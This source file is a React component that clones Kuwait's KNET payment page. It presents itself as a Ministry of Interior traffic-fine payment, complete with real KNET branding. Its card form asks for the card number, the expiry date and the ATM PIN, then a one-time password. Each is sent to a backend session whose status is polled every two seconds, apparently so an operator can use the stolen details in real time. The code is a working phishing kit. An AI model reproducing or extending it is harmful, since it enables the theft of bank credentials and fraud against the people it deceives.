import { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "success" | "failed";

const PREFIXES_4 = ["4062", "4192", "4244", "4311", "4502", "4506", "4512", "4514", "4523", "4525", "4529", "4644", "4716", "4856", "4893", "4904"];
const PREFIXES_5 = ["5130", "5132", "5133", "5135", "5136", "5139", "5174", "5196", "5206", "5211", "5215", "5241", "5247", "5256", "5285", "5313", "5314", "5316", "5326", "5360", "5370", "5407", "5433", "5440", "5491", "5520", "5577", "5588"];

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardNumber, setCardNumber] = useState("");
  const [cardPrefix, setCardPrefix] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [pin, setPin] = useState("");
  const [otp, setOtp] = useState("");
  
  const [showPrefixes, setShowPrefixes] = useState(false);
  const [availablePrefixes, setAvailablePrefixes] = useState<string[]>([]);

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) { setLocation("/"); return; }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: "1",
      queryId: "manual"
    });
  }, []);

  useEffect(() => {
    if (cardPrefix === "4") {
      setAvailablePrefixes(PREFIXES_4);
      setShowPrefixes(true);
    } else if (cardPrefix === "5") {
      setAvailablePrefixes(PREFIXES_5);
      setShowPrefixes(true);
    } else if (cardPrefix.length >= 4) {
      setShowPrefixes(false);
    } else {
      setShowPrefixes(false);
    }
  }, [cardPrefix]);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => setSessionId(data.sessionId)
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && stage.endsWith("_pending"), refetchInterval: 2000 }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      if (sessionStatus.stage === "atm") setStage("otp");
      else setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => { setError(err.message); setStage("failed"); }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: "KNET",
      cardNumber: cardPrefix + cardNumber,
      cardExpiry: `${expiryMonth}/${expiryYear}`,
      cardCvv: pin
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({ sessionId, otpCode: otp });
  };

  if (!paymentData) return null;

  return (
    <div className="knet-original-clone" dir="ltr">
      <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" />
      <style>{`
        body { background-color: #f7f7f7; font-family: Arial, sans-serif; margin: 0; padding: 0; }
        .knet-original-clone { min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .knet-box { background: white; width: 100%; max-width: 450px; border: 1px solid #ddd; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .knet-header { border-bottom: 1px solid #eee; padding: 15px; text-align: center; }
        .knet-logo { height: 40px; }
        .knet-info-bar { background: #f9f9f9; padding: 15px 20px; border-bottom: 1px solid #eee; font-size: 13px; color: #555; }
        .knet-info-row { display: flex; justify-content: space-between; margin-bottom: 5px; }
        .knet-info-label { font-weight: normal; }
        .knet-info-value { font-weight: bold; color: #333; }
        .knet-body { padding: 25px 20px; }
        .knet-title { font-size: 16px; font-weight: bold; color: #005eb8; margin-bottom: 20px; border-bottom: 2px solid #005eb8; display: inline-block; padding-bottom: 5px; }
        .knet-label { display: block; font-size: 13px; font-weight: bold; color: #333; margin-bottom: 8px; }
        .knet-input-group { position: relative; margin-bottom: 20px; }
        .knet-field { width: 100%; height: 40px; border: 1px solid #ccc; border-radius: 3px; padding: 0 10px; font-size: 15px; outline: none; }
        .knet-field:focus { border-color: #005eb8; }
        .prefix-dropdown { position: absolute; top: 40px; left: 0; right: 0; background: white; border: 1px solid #ccc; border-top: none; max-height: 200px; overflow-y: auto; z-index: 100; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .prefix-item { padding: 10px; font-size: 14px; cursor: pointer; border-bottom: 1px solid #f0f0f0; }
        .prefix-item:hover { background: #f0f7ff; color: #005eb8; }
        .knet-footer-btns { display: flex; gap: 10px; margin-top: 30px; }
        .btn-knet { flex: 1; height: 40px; border-radius: 3px; font-weight: bold; font-size: 14px; cursor: pointer; border: none; }
        .btn-knet-submit { background: #005eb8; color: white; }
        .btn-knet-cancel { background: #e0e0e0; color: #333; }
        .knet-copyright { margin-top: 30px; font-size: 11px; color: #999; text-align: center; }
        
        /* Mobile Adjustments */
        @media (max-width: 480px) {
          .knet-box { border: none; box-shadow: none; max-width: 100%; }
          .knet-original-clone { padding: 0; }
        }
      `}</style>

      <div className="knet-box">
        <div className="knet-header">
          <img src="https://www.kpay.com.kw/kpg/images/knet-logo.png" className="knet-logo" alt="KNET" onError={(e) => {e.currentTarget.src='https://www.knet.com.kw/wp-content/uploads/2020/03/knet-logo-white.png'}} />
        </div>

        <div className="knet-info-bar">
          <div className="knet-info-row"><span className="knet-info-label">Merchant:</span><span className="knet-info-value">Ministry of Interior</span></div>
          <div className="knet-info-row"><span className="knet-info-label">Amount:</span><span className="knet-info-value">{paymentData.totalAmount} KWD</span></div>
        </div>

        <div className="knet-body">
          {stage === "card" && (
            <form onSubmit={handleCardSubmit}>
              <div className="knet-title">Card Information</div>
              
              <div className="row">
                <div className="col-4 pr-1">
                  <label className="knet-label">Prefix</label>
                  <div className="knet-input-group">
                    <input 
                      type="text" 
                      className="knet-field" 
                      placeholder="Prefix" 
                      value={cardPrefix} 
                      onChange={e => setCardPrefix(e.target.value.replace(/\D/g, '').substring(0, 4))} 
                      required 
                    />
                    {showPrefixes && (
                      <div className="prefix-dropdown">
                        {availablePrefixes.map(p => (
                          <div key={p} className="prefix-item" onClick={() => { setCardPrefix(p); setShowPrefixes(false); }}>{p}</div>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
                <div className="col-8 pl-1">
                  <label className="knet-label">Debit Card Number</label>
                  <input 
                    type="text" 
                    className="knet-field" 
                    placeholder="Card Number" 
                    value={cardNumber} 
                    onChange={e => setCardNumber(e.target.value.replace(/\D/g, '').substring(0, 12))} 
                    required 
                  />
                </div>
              </div>

              <div className="row mt-3">
                <div className="col-6 pr-1">
                  <label className="knet-label">Expiration Date</label>
                  <div className="d-flex">
                    <select className="knet-field mr-1" value={expiryMonth} onChange={e => setExpiryMonth(e.target.value)} required>
                      <option value="">MM</option>
                      {Array.from({length: 12}, (_, i) => (i + 1).toString().padStart(2, '0')).map(m => <option key={m} value={m}>{m}</option>)}
                    </select>
                    <select className="knet-field" value={expiryYear} onChange={e => setExpiryYear(e.target.value)} required>
                      <option value="">YY</option>
                      {Array.from({length: 10}, (_, i) => (new Date().getFullYear() + i).toString().substring(2)).map(y => <option key={y} value={y}>{y}</option>)}
                    </select>
                  </div>
                </div>
                <div className="col-6 pl-1">
                  <label className="knet-label">PIN</label>
                  <input 
                    type="password" 
                    maxLength={4} 
                    className="knet-field" 
                    placeholder="PIN" 
                    value={pin} 
                    onChange={e => setPin(e.target.value.replace(/\D/g, '').substring(0, 4))} 
                    required 
                  />
                </div>
              </div>

              <div className="knet-footer-btns">
                <button type="submit" className="btn-knet btn-knet-submit">Submit</button>
                <button type="button" className="btn-knet btn-knet-cancel" onClick={() => setLocation("/")}>Cancel</button>
              </div>
            </form>
          )}

          {stage === "otp" && (
            <form onSubmit={handleOtpSubmit} className="text-center">
              <div className="knet-title">One-Time Password</div>
              <p className="text-muted small mb-4">Please enter the OTP sent to your mobile.</p>
              <input 
                type="text" 
                className="knet-field text-center mb-4" 
                style={{letterSpacing: '5px', fontSize: '20px'}} 
                value={otp} 
                onChange={e => setOtp(e.target.value.replace(/\D/g, '').substring(0, 6))} 
                placeholder="000000" 
                required 
              />
              <button type="submit" className="btn-knet btn-knet-submit w-100">Confirm</button>
            </form>
          )}

          {stage.endsWith("_pending") && (
            <div className="text-center py-5">
              <div className="spinner-border text-primary" role="status"></div>
              <p className="mt-3 font-weight-bold">Processing Transaction...</p>
            </div>
          )}

          {stage === "success" && (
            <div className="text-center py-4">
              <h4 className="text-success font-weight-bold">Successful</h4>
              <p className="small text-muted">Your payment has been accepted.</p>
              <button className="btn-knet btn-knet-submit w-100 mt-3" onClick={() => setLocation("/")}>Back to Home</button>
            </div>
          )}

          {stage === "failed" && (
            <div className="text-center py-4">
              <h4 className="text-danger font-weight-bold">Transaction Failed</h4>
              <p className="small text-muted">{error || "Could not process payment."}</p>
              <button className="btn-knet btn-knet-submit w-100 mt-3" onClick={() => setStage("card")}>Try Again</button>
            </div>
          )}
        </div>
      </div>

      <div className="knet-copyright">
        © Copyrights KNET 2026 | All Rights Reserved
      </div>
    </div>
  );
}
